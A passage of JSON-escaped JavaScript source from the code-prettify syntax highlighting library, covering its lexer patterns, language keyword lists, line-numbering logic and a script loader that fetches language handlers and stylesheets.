/^(?:\\'(?:[^\\\\\\'\\r\\n]|\\\\.)*(?:\\'|$)|\\\"(?:[^\\\\\\\"\\r\\n]|\\\\.)*(?:\\\"|$))/, null, '\"\\'']); } if (options['verbatimStrings']) { // verbatim-string-literal production from the C# grammar. See issue 93. fallthroughStylePatterns.push( [PR_STRING, /^@\\\"(?:[^\\\"]|\\\"\\\")*(?:\\\"|$)/, null]); } var hc = options['hashComments']; if (hc) { if (options['cStyleComments']) { if (hc > 1) { // multiline hash comments shortcutStylePatterns.push( [PR_COMMENT, /^#(?:##(?:[^#]|#(?!##))*(?:###|$)|.*)/, null, '#']); } else { // Stop C preprocessor declarations at an unclosed open comment shortcutStylePatterns.push( [PR_COMMENT, /^#(?:(?:define|e(?:l|nd)if|else|error|ifn?def|include|line|pragma|undef|warning)\\b|[^\\r\\n]*)/, null, '#']); } // #include fallthroughStylePatterns.push( [PR_STRING, /^/, null]); } else { shortcutStylePatterns.push([PR_COMMENT, /^#[^\\r\\n]*/, null, '#']); } } if (options['cStyleComments']) { fallthroughStylePatterns.push([PR_COMMENT, /^\\/\\/[^\\r\\n]*/, null]); fallthroughStylePatterns.push( [PR_COMMENT, /^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/, null]); } var regexLiterals = options['regexLiterals']; if (regexLiterals) { /** * @const */ var regexExcls = regexLiterals > 1 ? '' // Multiline regex literals : '\\n\\r'; /** * @const */ var regexAny = regexExcls ? '.' : '[\\\\S\\\\s]'; /** * @const */ var REGEX_LITERAL = ( // A regular expression literal starts with a slash that is // not followed by * or / so that it is not confused with // comments. '/(?=[^/*' + regexExcls + '])' // and then contains any number of raw characters, + '(?:[^/\\\\x5B\\\\x5C' + regexExcls + ']' // escape sequences (\\x5C), + '|\\\\x5C' + regexAny // or non-nesting character sets (\\x5B\\x5D); + '|\\\\x5B(?:[^\\\\x5C\\\\x5D' + regexExcls + ']' + '|\\\\x5C' + regexAny + ')*(?:\\\\x5D|$))+' // finally closed by a /. + '/'); fallthroughStylePatterns.push( ['lang-regex', RegExp('^' + REGEXP_PRECEDER_PATTERN + '(' + REGEX_LITERAL + ')') ]); } var types = options['types']; if (types) { fallthroughStylePatterns.push([PR_TYPE, types]); } var keywords = (\"\" + options['keywords']).replace(/^ | $/g, ''); if (keywords.length) { fallthroughStylePatterns.push( [PR_KEYWORD, new RegExp('^(?:' + keywords.replace(/[\\s,]+/g, '|') + ')\\\\b'), null]); } shortcutStylePatterns.push([PR_PLAIN, /^\\s+/, null, ' \\r\\n\\t\\xA0']); var punctuation = // The Bash man page says // A word is a sequence of characters considered as a single // unit by GRUB. Words are separated by metacharacters, // which are the following plus space, tab, and newline: { } // | & $ ; < > // ... // A word beginning with # causes that word and all remaining // characters on that line to be ignored. // which means that only a '#' after /(?:^|[{}|&$;\\s])/ starts a // comment but empirically // $ echo // $ echo \\$# // $# // $ echo }# // }# // so /(?:^|[|&;\\s])/ is more appropriate. // http://gcc.gnu.org/onlinedocs/gcc-2.95.3/cpp_1.html#SEC3 // suggests that this definition is compatible with a // default mode that tries to use a single token definition // to recognize both bash/python style comments and C // preprocessor directives. // This definition of punctuation does not include # in the list of // follow-on exclusions, so # will not be broken before if preceeded // by a punctuation character. We could try to exclude # after // [|&;] but that doesn't seem to cause many major problems. // If that does turn out to be a problem, we should change the below // when hc is truthy to include # in the run of punctuation characters // only when not followint [|&;]. '^.[^\\\\s\\\\w.$@\\'\"`/\\\\\\\\]*'; if (options['regexLiterals']) { punctuation += '(?!\\s*\\/)'; } fallthroughStylePatterns.push( // TODO(mikesamuel): recognize non-latin letters and numerals in idents [PR_LITERAL, /^@[a-z_$][a-z_$@0-9]*/i, null], [PR_TYPE, /^(?:[@_]?[A-Z]+[a-z][A-Za-z_$@0-9]*|\\w+_t\\b)/, null], [PR_PLAIN, /^[a-z_$][a-z_$@0-9]*/i, null], [PR_LITERAL, new RegExp( '^(?:' // A hex number + '0x[a-f0-9]+' // or an octal or decimal number, + '|(?:\\\\d(?:_\\\\d+)*\\\\d*(?:\\\\.\\\\d*)?|\\\\.\\\\d\\\\+)' // possibly in scientific notation + '(?:e[+\\\\-]?\\\\d+)?' + ')' // with an optional modifier like UL for unsigned long + '[a-z]*', 'i'), null, '0123456789'], // Don't treat escaped quotes in bash as starting strings. // See issue 144. [PR_PLAIN, /^\\\\[\\s\\S]?/, null], [PR_PUNCTUATION, new RegExp(punctuation), null]); return createSimpleLexer(shortcutStylePatterns, fallthroughStylePatterns); } var decorateSource = sourceDecorator({ 'keywords': ALL_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'multiLineStrings': true, 'regexLiterals': true }); /** * Given a DOM subtree, wraps it in a list, and puts each line into its own * list item. * * @param {Node} node modified in place. Its content is pulled into an * HTMLOListElement, and each line is moved into a separate list item. * This requires cloning elements, so the input might not have unique * IDs after numbering. * @param {number|null|boolean} startLineNum * If truthy, coerced to an integer which is the 1-indexed line number * of the first line of code. The number of the first line will be * attached to the list. * @param {boolean} isPreformatted true iff white-space in text nodes should * be treated as significant. */ function numberLines(node, startLineNum, isPreformatted) { var nocode = /(?:^|\\s)nocode(?:\\s|$)/; var lineBreak = /\\r\\n?|\\n/; var document = node.ownerDocument; var li = document.createElement('li'); while (node.firstChild) { li.appendChild(node.firstChild); } // An array of lines. We split below, so this is initialized to one // un-split line. var listItems = [li]; function walk(node) { var type = node.nodeType; if (type == 1 && !nocode.test(node.className)) { // Element if ('br' === node.nodeName.toLowerCase()) { breakAfter(node); // Discard the since it is now flush against a . if (node.parentNode) { node.parentNode.removeChild(node); } } else { for (var child = node.firstChild; child; child = child.nextSibling) { walk(child); } } } else if ((type == 3 || type == 4) && isPreformatted) { // Text var text = node.nodeValue; var match = text.match(lineBreak); if (match) { var firstLine = text.substring(0, match.index); node.nodeValue = firstLine; var tail = text.substring(match.index + match[0].length); if (tail) { var parent = node.parentNode; parent.insertBefore( document.createTextNode(tail), node.nextSibling); } breakAfter(node); if (!firstLine) { // Don't leave blank text nodes in the DOM. node.parentNode.removeChild(node); } } } } // Split a line after the given node. function breakAfter(lineEndNode) { // If there's nothing to the right, then we can skip ending the line // here, and move root-wards since splitting just before an end-tag // would require us to create a bunch of empty copies. while (!lineEndNode.nextSibling) { lineEndNode = lineEndNode.parentNode; if (!lineEndNode) { return; } } function breakLeftOf(limit, copy) { // Clone shallowly if this node needs to be on both sides of the break. var rightSide = copy ? limit.cloneNode(false) : limit; var parent = limit.parentNode; if (parent) { // We clone the parent chain. // This helps us resurrect important styling elements that cross lines. // E.g. in FooBar // should be rewritten to FooBar. var parentClone = breakLeftOf(parent, 1); // Move the clone and everything to the right of the original // onto the cloned parent. var next = limit.nextSibling; parentClone.appendChild(rightSide); for (var sibling = next; sibling; sibling = next) { next = sibling.nextSibling; parentClone.appendChild(sibling); } } return rightSide; } var copiedListItem = breakLeftOf(lineEndNode.nextSibling, 0); // Walk the parent chain until we reach an unattached LI. for (var parent; // Check nodeType since IE invents document fragments. (parent = copiedListItem.parentNode) && parent.nodeType === 1;) { copiedListItem = parent; } // Put it on the list of lines for later processing. listItems.push(copiedListItem); } // Split lines while there are lines left to split. for (var i = 0; // Number of lines that have been split so far. i < listItems.length; // length updated by breakAfter calls. ++i) { walk(listItems[i]); } // Make sure numeric indices show correctly. if (startLineNum === (startLineNum|0)) { listItems[0].setAttribute('value', startLineNum); } var ol = document.createElement('ol'); ol.className = 'linenums'; var offset = Math.max(0, ((startLineNum - 1 /* zero index */)) | 0) || 0; for (var i = 0, n = listItems.length; i < n; ++i) { li = listItems[i]; // Stick a class on the LIs so that stylesheets can // color odd/even rows, or any other row pattern that // is co-prime with 10. li.className = 'L' + ((i + offset) % 10); if (!li.firstChild) { li.appendChild(document.createTextNode('\\xA0')); } ol.appendChild(li); } node.appendChild(ol); } /** * Breaks {@code job.sourceCode} around style boundaries in * {@code job.decorations} and modifies {@code job.sourceNode} in place. * @param {JobT} job * @private */ function recombineTagsAndDecorations(job) { var isIE8OrEarlier = /\\bMSIE\\s(\\d+)/.exec(navigator.userAgent); isIE8OrEarlier = isIE8OrEarlier && +isIE8OrEarlier[1]","path":"plugins/prettify/node_prettify.js"},{"title":"","text":"/** * @license * Copyright (C) 2013 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * * Looks at query parameters to decide which language handlers and style-sheets * to load. * * Query Parameter Format Effect Default * +------------------+---------------+------------------------------+--------+ * | autorun= | true | false | If true then prettyPrint() | \"true\" | * | | | is called on page load. | | * +------------------+---------------+------------------------------+--------+ * | lang= | language name | Loads the language handler | Can | * | | | named \"lang-.js\". | appear | * | | | See available handlers at | many | * | | | https://github.com/google/ | times. | * | | | code-prettify/tree/master/ | | * | | | src | | * +------------------+---------------+------------------------------+--------+ * | skin= | skin name | Loads the skin stylesheet | none. | * | | | named \".css\". | | * | | | https://cdn.rawgit.com/ | | * | | | google/code-prettify/master/ | | * | | | styles/index.html | | * +------------------+---------------+------------------------------+--------+ * | callback= | JS identifier | When \"prettyPrint\" finishes | none | * | | | window.exports[js_ident] is | | * | | | called. | | * | | | The callback must be under | | * | | | exports to reduce the risk | | * | | | of XSS via query parameter | | * | | | injection. | | * +------------------+---------------+------------------------------+--------+ * * Examples * .../run_prettify.js?lang=css&skin=sunburst * 1. Loads the CSS language handler which can be used to prettify CSS * stylesheets, HTML element bodies and style=\"...\" attributes * values. * 2. Loads the sunburst.css stylesheet instead of the default prettify.css * stylesheet. * A gallery of stylesheets is available at * https://cdn.rawgit.com/google/code-prettify/master/styles/index.html * 3. Since autorun=false is not specified, calls prettyPrint() on page load. * */ /** * @typedef {!Array.} * Alternating indices and the decorations that should be inserted there. * The indices are monotonically increasing. */ var DecorationsT; /** * @typedef {!{ * sourceNode: !Element, * pre: !(number|boolean), * langExtension: ?string, * numberLines: ?(number|boolean), * sourceCode: ?string, * spans: ?(Array.), * basePos: ?number, * decorations: ?DecorationsT * }} * * sourceNodethe element containing the source * sourceCodesource as plain text * pretruthy if white-space in text nodes * should be considered significant. * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * decorationsan array of style classes preceded * by the position at which they start in job.sourceCode in order * basePosinteger position of this.sourceCode in the larger chunk of * source. * */ var JobT; /** * @typedef {!{ * sourceCode: string, * spans: !(Array.) * }} * * sourceCodesource as plain text * spans alternating span start indices into source * and the text node or element (e.g. {@code }) corresponding to that * span. * */ var SourceSpansT; /** @define {boolean} */ var IN_GLOBAL_SCOPE = false; (function () { \"use strict\"; var win = window; var doc = document; var root = doc.documentElement; var head = doc['head'] || doc.getElementsByTagName(\"head\")[0] || root; // From http://javascript.nwbox.com/ContentLoaded/contentloaded.js // Author: Diego Perini (diego.perini at gmail.com) // Summary: cross-browser wrapper for DOMContentLoaded // Updated: 20101020 // License: MIT // Version: 1.2 function contentLoaded(callback) { var addEventListener = doc['addEventListener']; var done = false, top = true, add = addEventListener ? 'addEventListener' : 'attachEvent', rem = addEventListener ? 'removeEventListener' : 'detachEvent', pre = addEventListener ? '' : 'on', init = function(e) { if (e.type == 'readystatechange' && doc.readyState != 'complete') { return; } (e.type == 'load' ? win : doc)[rem](pre + e.type, init, false); if (!done && (done = true)) { callback.call(win, e.type || e); } }, poll = function() { try { root.doScroll('left'); } catch(e) { win.setTimeout(poll, 50); return; } init('poll'); }; if (doc.readyState == 'complete') { callback.call(win, 'lazy'); } else { if (doc.createEventObject && root.doScroll) { try { top = !win.frameElement; } catch(e) { } if (top) { poll(); } } doc[add](pre + 'DOMContentLoaded', init, false); doc[add](pre + 'readystatechange', init, false); win[add](pre + 'load', init, false); } } // Given a list of URLs to stylesheets, loads the first that loads without // triggering an error event. function loadStylesheetsFallingBack(stylesheets) { var n = stylesheets.length; function load(i) { if (i === n) { return; } var link = doc.createElement('link'); link.rel = 'stylesheet'; link.type = 'text/css'; if (i + 1 < n) { // http://pieisgood.org/test/script-link-events/ indicates that many // versions of IE do not support onerror on s, though // http://msdn.microsoft.com/en-us/library/ie/ms535848(v=vs.85).aspx // indicates that recent IEs do support error. link.error = link.onerror = function () { load(i + 1); }; } link.href = stylesheets[i]; head.appendChild(link); } load(0); } var scriptQuery = ''; // Look for the node that loads this script to get its parameters. // This starts looking at the end instead of just considering the last // because deferred and async scripts run out of order. // If the script is loaded twice, then this will run in reverse order. var scripts = doc.getElementsByTagName('script'); for (var i = scripts.length; --i >= 0;) { var script = scripts[i]; var match = script.src.match( /^[^?#]*\\/run_prettify\\.js(\\?[^#]*)?(?:#.*)?$/); if (match) { scriptQuery = match[1] || ''; // Remove the script from the DOM so that multiple runs at least run // multiple times even if parameter sets are interpreted in reverse // order. script.parentNode.removeChild(script); break; } } // Pull parameters into local variables. var autorun = true; var langs = []; var skins = []; var callbacks = []; scriptQuery.replace( /[?&]([^&=]+)=([^&]+)/g, function (_, name, value) { value = decodeURIComponent(value); name = decodeURIComponent(name); if (name == 'autorun') { autorun = !/^[0fn]/i.test(value); } else if (name == 'lang') { langs.push(value); } else if (name == 'skin') { skins.push(value); } else if (name == 'callback') { callbacks.push(value); } }); // Use https to avoid mixed content warnings in client pages and to // prevent a MITM from rewrite prettify mid-flight. // This only works if this script is loaded via https : something // over which we exercise no control. var LOADER_BASE_URL = 'https://cdn.rawgit.com/google/code-prettify/master/loader'; for (var i = 0, n = langs.length; i < n; ++i) (function (lang) { var script = doc.createElement(\"script\"); // Excerpted from jQuery.ajaxTransport(\"script\") to fire events when // a script is finished loading. // Attach handlers for each script script.onload = script.onerror = script.onreadystatechange = function () { if (script && ( !script.readyState || /loaded|complete/.test(script.readyState))) { // Handle memory leak in IE script.onerror = script.onload = script.onreadystatechange = null; --pendingLanguages; checkPendingLanguages(); // Remove the script if (script.parentNode) { script.parentNode.removeChild(script); } script = null; } }; script.type = 'text/javascript'; script.src = LOADER_BASE_URL + '/lang-' + encodeURIComponent(langs[i]) + '.js'; // Circumvent IE6 bugs with base elements (#2709 and #4378) by prepending head.insertBefore(script, head.firstChild); })(langs[i]); var pendingLanguages = langs.length; function checkPendingLanguages() { if (!pendingLanguages) { win.setTimeout(onLangsLoaded, 0); } } var skinUrls = []; for (var i = 0, n = skins.length; i < n; ++i) { skinUrls.push(LOADER_BASE_URL + '/skins/' + encodeURIComponent(skins[i]) + '.css'); } skinUrls.push(LOADER_BASE_URL + '/prettify.css'); loadStylesheetsFallingBack(skinUrls); var prettyPrint = (function () { /** * @license * Copyright (C) 2006 Google Inc. * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ /** * @fileoverview * some functions for browser-side pretty printing of code contained in html. * * * For a fairly comprehensive set of languages see the * README * file that came with this source. At a minimum, the lexer should work on a * number of languages including C and friends, Java, Python, Bash, SQL, HTML, * XML, CSS, Javascript, and Makefiles. It works passably on Ruby, PHP and Awk * and a subset of Perl, but, because of commenting conventions, doesn't work on * Smalltalk, Lisp-like, or CAML-like languages without an explicit lang class. * * Usage: * include this source file in an html page via * {@code } * define style rules. See the example page for examples. * mark the {@code } and {@code } tags in your source with * {@code class=prettyprint.} * You can also use the (html deprecated) {@code } tag, but the pretty * printer needs to do more substantial DOM manipulations to support that, so * some css styles may not be preserved. * * That's it. I wanted to keep the API as simple as possible, so there's no * need to specify which language the code is in, but if you wish, you can add * another class to the {@code } or {@code } element to specify the * language, as in {@code }. Any class that * starts with \"lang-\" followed by a file extension, specifies the file type. * See the \"lang-*.js\" files in this directory for code that implements * per-language file handlers. * * Change log: * cbeust, 2006/08/22 * * Java annotations (start with \"@\") are now captured as literals (\"lit\") * * @requires console */ // JSLint declarations /*global console, document, navigator, setTimeout, window, define */ /** * {@type !{ * 'createSimpleLexer': function (Array, Array): (function (JobT)), * 'registerLangHandler': function (function (JobT), Array.), * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_NAME': string, * 'PR_ATTRIB_VALUE': string, * 'PR_COMMENT': string, * 'PR_DECLARATION': string, * 'PR_KEYWORD': string, * 'PR_LITERAL': string, * 'PR_NOCODE': string, * 'PR_PLAIN': string, * 'PR_PUNCTUATION': string, * 'PR_SOURCE': string, * 'PR_STRING': string, * 'PR_TAG': string, * 'PR_TYPE': string, * 'prettyPrintOne': function (string, string, number|boolean), * 'prettyPrint': function (?function, ?(HTMLElement|HTMLDocument)) * }} * @const */ var PR; /** * Split {@code prettyPrint} into multiple timeouts so as not to interfere with * UI events. * If set to {@code false}, {@code prettyPrint()} is synchronous. */ var PR_SHOULD_USE_CONTINUATION = true if (typeof window !== 'undefined') { window['PR_SHOULD_USE_CONTINUATION'] = PR_SHOULD_USE_CONTINUATION; } /** * Pretty print a chunk of code. * @param {string} sourceCodeHtml The HTML to pretty print. * @param {string} opt_langExtension The language name to use. * Typically, a filename extension like 'cpp' or 'java'. * @param {number|boolean} opt_numberLines True to number lines, * or the 1-indexed number of the first line in sourceCodeHtml. * @return {string} code as html, but prettier */ var prettyPrintOne; /** * Find all the {@code } and {@code } tags in the DOM with * {@code class=prettyprint} and prettify them. * * @param {Function} opt_whenDone called when prettifying is done. * @param {HTMLElement|HTMLDocument} opt_root an element or document * containing all the elements to pretty print. * Defaults to {@code document.body}. */ var prettyPrint; (function () { var win = (typeof window !== 'undefined') ? window : {}; // Keyword lists for various languages. // We use things that coerce to strings to make them compact when minified // and to defeat aggressive optimizers that fold large string constants. var FLOW_CONTROL_KEYWORDS = [\"break,continue,do,else,for,if,return,while\"]; var C_KEYWORDS = [FLOW_CONTROL_KEYWORDS,\"auto,case,char,const,default,\" + \"double,enum,extern,float,goto,inline,int,long,register,restrict,short,signed,\" + \"sizeof,static,struct,switch,typedef,union,unsigned,void,volatile\"]; var COMMON_KEYWORDS = [C_KEYWORDS,\"catch,class,delete,false,import,\" + \"new,operator,private,protected,public,this,throw,true,try,typeof\"]; var CPP_KEYWORDS = [COMMON_KEYWORDS,\"alignas,alignof,align_union,asm,axiom,bool,\" + \"concept,concept_map,const_cast,constexpr,decltype,delegate,\" + \"dynamic_cast,explicit,export,friend,generic,late_check,\" + \"mutable,namespace,noexcept,noreturn,nullptr,property,reinterpret_cast,static_assert,\" + \"static_cast,template,typeid,typename,using,virtual,where\"]; var JAVA_KEYWORDS = [COMMON_KEYWORDS, \"abstract,assert,boolean,byte,extends,finally,final,implements,import,\" + \"instanceof,interface,null,native,package,strictfp,super,synchronized,\" + \"throws,transient\"]; var CSHARP_KEYWORDS = [COMMON_KEYWORDS, \"abstract,add,alias,as,ascending,async,await,base,bool,by,byte,checked,decimal,delegate,descending,\" + \"dynamic,event,finally,fixed,foreach,from,get,global,group,implicit,in,interface,\" + \"internal,into,is,join,let,lock,null,object,out,override,orderby,params,\" + \"partial,readonly,ref,remove,sbyte,sealed,select,set,stackalloc,string,select,uint,ulong,\" + \"unchecked,unsafe,ushort,value,var,virtual,where,yield\"]; var COFFEE_KEYWORDS = \"all,and,by,catch,class,else,extends,false,finally,\" + \"for,if,in,is,isnt,loop,new,no,not,null,of,off,on,or,return,super,then,\" + \"throw,true,try,unless,until,when,while,yes\"; var JSCRIPT_KEYWORDS = [COMMON_KEYWORDS, \"abstract,async,await,constructor,debugger,enum,eval,export,from,function,\" + \"get,import,implements,instanceof,interface,let,null,of,set,undefined,\" + \"var,with,yield,Infinity,NaN\"]; var PERL_KEYWORDS = \"caller,delete,die,do,dump,elsif,eval,exit,foreach,for,\" + \"goto,if,import,last,local,my,next,no,our,print,package,redo,require,\" + \"sub,undef,unless,until,use,wantarray,while,BEGIN,END\"; var PYTHON_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"and,as,assert,class,def,del,\" + \"elif,except,exec,finally,from,global,import,in,is,lambda,\" + \"nonlocal,not,or,pass,print,raise,try,with,yield,\" + \"False,True,None\"]; var RUBY_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"alias,and,begin,case,class,\" + \"def,defined,elsif,end,ensure,false,in,module,next,nil,not,or,redo,\" + \"rescue,retry,self,super,then,true,undef,unless,until,when,yield,\" + \"BEGIN,END\"]; var SH_KEYWORDS = [FLOW_CONTROL_KEYWORDS, \"case,done,elif,esac,eval,fi,\" + \"function,in,local,set,then,until\"]; var ALL_KEYWORDS = [ CPP_KEYWORDS, CSHARP_KEYWORDS, JAVA_KEYWORDS, JSCRIPT_KEYWORDS, PERL_KEYWORDS, PYTHON_KEYWORDS, RUBY_KEYWORDS, SH_KEYWORDS]; var C_TYPES = /^(DIR|FILE|array|vector|(de|priority_)?queue|(forward_)?list|stack|(const_)?(reverse_)?iterator|(unordered_)?(multi)?(set|map)|bitset|u?(int|float)\\d*)\\b/; // token style names. correspond to css classes /** * token style for a string literal * @const */ var PR_STRING = 'str'; /** * token style for a keyword * @const */ var PR_KEYWORD = 'kwd'; /** * token style for a comment * @const */ var PR_COMMENT = 'com'; /** * token style for a type * @const */ var PR_TYPE = 'typ'; /** * token style for a literal value. e.g. 1, null, true. * @const */ var PR_LITERAL = 'lit'; /** * token style for a punctuation string. * @const */ var PR_PUNCTUATION = 'pun'; /** * token style for plain text. * @const */ var PR_PLAIN = 'pln'; /** * token style for an sgml tag. * @const */ var PR_TAG = 'tag'; /** * token style for a markup declaration such as a DOCTYPE. * @const */ var PR_DECLARATION = 'dec'; /** * token style for embedded source. * @const */ var PR_SOURCE = 'src'; /** * token style for an sgml attribute name. * @const */ var PR_ATTRIB_NAME = 'atn'; /** * token style for an sgml attribute value. * @const */ var PR_ATTRIB_VALUE = 'atv'; /** * A class that indicates a section of markup that is not code, e.g. to allow * embedding of line numbers within code listings. * @const */ var PR_NOCODE = 'nocode'; // Regex pattern below is automatically generated by regexpPrecederPatterns.pl // Do not modify, your changes will be erased. // CAVEAT: this does not properly handle the case where a regular // expression immediately follows another since a regular expression may // have flags for case-sensitivity and the like. Having regexp tokens // adjacent is not valid in any language I'm aware of, so I'm punting. // TODO: maybe style special characters inside a regexp as punctuation. /** * A set of tokens that can precede a regular expression literal in * javascript * http://web.archive.org/web/20070717142515/http://www.mozilla.org/js/language/js20/rationale/syntax.html * has the full list, but I've removed ones that might be problematic when * seen in languages that don't support regular expression literals. * * Specifically, I've removed any keywords that can't precede a regexp * literal in a syntactically legal javascript program, and I've removed the * \"in\" keyword since it's not a keyword in many languages, and might be used * as a count of inches. * * The link above does not accurately describe EcmaScript rules since * it fails to distinguish between (a=++/b/i) and (a++/b/i) but it works * very well in practice. * * @private * @const */ var REGEXP_PRECEDER_PATTERN = '(?:^^\\\\.?|[+-]|[!=]=?=?|\\\\#|%=?|&&?=?|\\\\(|\\\\*=?|[+\\\\-]=|->|\\\\/=?|::?|?>?=?|,|;|\\\\?|@|\\\\[|~|{|\\\\^\\\\^?=?|\\\\|\\\\|?=?|break|case|continue|delete|do|else|finally|instanceof|return|throw|try|typeof)\\\\s*'; /** * Given a group of {@link RegExp}s, returns a {@code RegExp} that globally * matches the union of the sets of strings matched by the input RegExp. * Since it matches globally, if the input strings have a start-of-input * anchor (/^.../), it is ignored for the purposes of unioning. * @param {Array.} regexs non multiline, non-global regexs. * @return {RegExp} a global regex. */ function combinePrefixPatterns(regexs) { var capturedGroupIndex = 0; var needToFoldCase = false; var ignoreCase = false; for (var i = 0, n = regexs.length; i < n; ++i) { var regex = regexs[i]; if (regex.ignoreCase) { ignoreCase = true; } else if (/[a-z]/i.test(regex.source.replace( /\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|\\\\[^ux]/gi, ''))) { needToFoldCase = true; ignoreCase = false; break; } } var escapeCharToCodeUnit = { 'b': 8, 't': 9, 'n': 0xa, 'v': 0xb, 'f': 0xc, 'r': 0xd }; function decodeEscape(charsetPart) { var cc0 = charsetPart.charCodeAt(0); if (cc0 !== 92 /* \\\\ */) { return cc0; } var c1 = charsetPart.charAt(1); cc0 = escapeCharToCodeUnit[c1]; if (cc0) { return cc0; } else if ('0' = 0;) { shortcuts[shortcutChars.charAt(c)] = patternParts; } } var regex = patternParts[1]; var k = '' + regex; if (!regexKeys.hasOwnProperty(k)) { allRegexs.push(regex); regexKeys[k] = null; } } allRegexs.push(/[\\0-\\uffff]/); tokenizer = combinePrefixPatterns(allRegexs); })(); var nPatterns = fallthroughStylePatterns.length; /** * Lexes job.sourceCode and attaches an output array job.decorations of * style classes preceded by the position at which they start in * job.sourceCode in order. * * @type{function (JobT)} */ var decorate = function (job) { var sourceCode = job.sourceCode, basePos = job.basePos; var sourceNode = job.sourceNode; /** Even entries are positions in source in ascending order. Odd enties * are style markers (e.g., PR_COMMENT) that run from that position until * the end. * @type {DecorationsT} */ var decorations = [basePos, PR_PLAIN]; var pos = 0; // index into sourceCode var tokens = sourceCode.match(tokenizer) || []; var styleCache = {}; for (var ti = 0, nTokens = tokens.length; ti < nTokens; ++ti) { var token = tokens[ti]; var style = styleCache[token]; var match = void 0; var isEmbedded; if (typeof style === 'string') { isEmbedded = false; } else { var patternParts = shortcuts[token.charAt(0)]; if (patternParts) { match = token.match(patternParts[1]); style = patternParts[0]; } else { for (var i = 0; i < nPatterns; ++i) { patternParts = fallthroughStylePatterns[i]; match = token.match(patternParts[1]); if (match) { style = patternParts[0]; break; } } if (!match) { // make sure that we make progress style = PR_PLAIN; } } isEmbedded = style.length >= 5 && 'lang-' === style.substring(0, 5); if (isEmbedded && !(match && typeof match[1] === 'string')) { isEmbedded = false; style = PR_SOURCE; } if (!isEmbedded) { styleCache[token] = style; } } var tokenStart = pos; pos += token.length; if (!isEmbedded) { decorations.push(basePos + tokenStart, style); } else { // Treat group 1 as an embedded block of source code. var embeddedSource = match[1]; var embeddedSourceStart = token.indexOf(embeddedSource); var embeddedSourceEnd = embeddedSourceStart + embeddedSource.length; if (match[2]) { // If embeddedSource can be blank, then it would match at the // beginning which would cause us to infinitely recurse on the // entire token, so we catch the right context in match[2]. embeddedSourceEnd = token.length - match[2].length; embeddedSourceStart = embeddedSourceEnd - embeddedSource.length; } var lang = style.substring(5); // Decorate the left of the embedded source appendDecorations( sourceNode, basePos + tokenStart, token.substring(0, embeddedSourceStart), decorate, decorations); // Decorate the embedded source appendDecorations( sourceNode, basePos + tokenStart + embeddedSourceStart, embeddedSource, langHandlerForExtension(lang, embeddedSource), decorations); // Decorate the right of the embedded section appendDecorations( sourceNode, basePos + tokenStart + embeddedSourceEnd, token.substring(embeddedSourceEnd), decorate, decorations); } } job.decorations = decorations; }; return decorate; } /** returns a function that produces a list of decorations from source text. * * This code treats \", ', and ` as string delimiters, and \\ as a string * escape. It does not recognize perl's qq() style strings. * It has no special handling for double delimiter escapes as in basic, or * the tripled delimiters used in python, but should work on those regardless * although in those cases a single string literal may be broken up into * multiple adjacent string literals. * * It recognizes C, C++, and shell style comments. * * @param {Object} options a set of optional parameters. * @return {function (JobT)} a function that examines the source code * in the input job and builds a decoration list which it attaches to * the job. */ function sourceDecorator(options) { var shortcutStylePatterns = [], fallthroughStylePatterns = []; if (options['tripleQuotedStrings']) { // '''multi-line-string''', 'single-line-string', and double-quoted shortcutStylePatterns.push( [PR_STRING, /^(?:\\'\\'\\'(?:[^\\'\\\\]|\\\\[\\s\\S]|\\'{1,2}(?=[^\\']))*(?:\\'\\'\\'|$)|\\\"\\\"\\\"(?:[^\\\"\\\\]|\\\\[\\s\\S]|\\\"{1,2}(?=[^\\\"]))*(?:\\\"\\\"\\\"|$)|\\'(?:[^\\\\\\']|\\\\[\\s\\S])*(?:\\'|$)|\\\"(?:[^\\\\\\\"]|\\\\[\\s\\S])*(?:\\\"|$))/, null, '\\'\"']); } else if (options['multiLineStrings']) { // 'multi-line-string', \"multi-line-string\" shortcutStylePatterns.push( [PR_STRING, /^(?:\\'(?:[^\\\\\\']|\\\\[\\s\\S])*(?:\\'|$)|\\\"(?:[^\\\\\\\"]|\\\\[\\s\\S])*(?:\\\"|$)|\\`(?:[^\\\\\\`]|\\\\[\\s\\S])*(?:\\`|$))/, null, '\\'\"`']); } else { // 'single-line-string', \"single-line-string\" shortcutStylePatterns.push( [PR_STRING, /^(?:\\'(?:[^\\\\\\'\\r\\n]|\\\\.)*(?:\\'|$)|\\\"(?:[^\\\\\\\"\\r\\n]|\\\\.)*(?:\\\"|$))/, null, '\"\\'']); } if (options['verbatimStrings']) { // verbatim-string-literal production from the C# grammar. See issue 93. fallthroughStylePatterns.push( [PR_STRING, /^@\\\"(?:[^\\\"]|\\\"\\\")*(?:\\\"|$)/, null]); } var hc = options['hashComments']; if (hc) { if (options['cStyleComments']) { if (hc > 1) { // multiline hash comments shortcutStylePatterns.push( [PR_COMMENT, /^#(?:##(?:[^#]|#(?!##))*(?:###|$)|.*)/, null, '#']); } else { // Stop C preprocessor declarations at an unclosed open comment shortcutStylePatterns.push( [PR_COMMENT, /^#(?:(?:define|e(?:l|nd)if|else|error|ifn?def|include|line|pragma|undef|warning)\\b|[^\\r\\n]*)/, null, '#']); } // #include fallthroughStylePatterns.push( [PR_STRING, /^/, null]); } else { shortcutStylePatterns.push([PR_COMMENT, /^#[^\\r\\n]*/, null, '#']); } } if (options['cStyleComments']) { fallthroughStylePatterns.push([PR_COMMENT, /^\\/\\/[^\\r\\n]*/, null]); fallthroughStylePatterns.push( [PR_COMMENT, 